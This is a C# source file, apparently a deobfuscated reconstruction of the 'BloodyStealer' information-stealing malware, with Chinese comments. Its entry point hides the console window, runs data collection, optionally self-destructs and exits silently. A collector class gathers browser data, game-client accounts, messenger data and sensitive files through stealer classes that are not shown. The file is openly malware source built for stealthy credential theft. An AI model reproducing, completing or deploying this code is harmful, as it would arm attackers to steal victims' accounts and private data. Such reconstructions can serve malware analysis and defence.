using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace BloodyStealer
{
    /// <summary>
    /// 程序主类 - 该恶意软件的主要入口点
    /// </summary>
    internal static class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        /// <summary>
        /// 应用程序的主入口点
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
            {
                // 隐藏控制台窗口
                IntPtr handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
                
                // 初始化设置
                Settings.Initialize();
                
                // 创建主程序实例并运行
                MainProgram program = new MainProgram();
                bool success = program.Run();
                
                // 如果设置了自毁选项
                if (Settings.SelfDestruct)
                {
                    Utils.SelfDestruct();
                }
                
                // 静默退出
                Environment.Exit(success ? 0 : 1);
            }
            catch (Exception ex)
            {
                try
                {
                    // 记录错误到临时文件
                    string errorLog = Path.Combine(Path.GetTempPath(), "error_log.txt");
                    File.WriteAllText(errorLog, $"Error: {ex.Message}\n{ex.StackTrace}");
                }
                catch
                {
                    // 忽略记录错误的错误
                }
                
                Environment.Exit(1);
            }
        }
    }

    /// <summary>
    /// 数据收集器类 - 负责收集所有类型的数据
    /// </summary>
    internal class DataCollector
    {
        /// <summary>
        /// 收集到的所有数据
        /// </summary>
        public List<FileObject> Results { get; set; }

        /// <summary>
        /// 地理位置信息
        /// </summary>
        public GeoInfo GeoInfo { get; private set; }

        /// <summary>
        /// 收集浏览器数据
        /// </summary>
        public void CollectBrowserData()
        {
            // 原始代码: c.m000001()
            var browserData = BrowserStealer.CollectAllBrowserData();
            lock (Results)
            {
                Results.AddRange(browserData);
            }
        }

        /// <summary>
        /// 收集游戏客户端数据
        /// </summary>
        public void CollectGameClients()
        {
            // 原始代码: c.m000002()
            var gameData = GameStealer.CollectAllGameData();
            lock (Results)
            {
                Results.AddRange(gameData);
            }
        }

        /// <summary>
        /// 收集即时通讯软件数据
        /// </summary>
        public void CollectMessengers()
        {
            // 原始代码: c.m000003()
            var messengerData = MessengerStealer.CollectAllMessengerData();
            var fileData = FileStealer.CollectSensitiveFiles();
            
            lock (Results)
            {
                Results.AddRange(messengerData);
                Results.AddRange(fileData);
            }
        }
    }
} 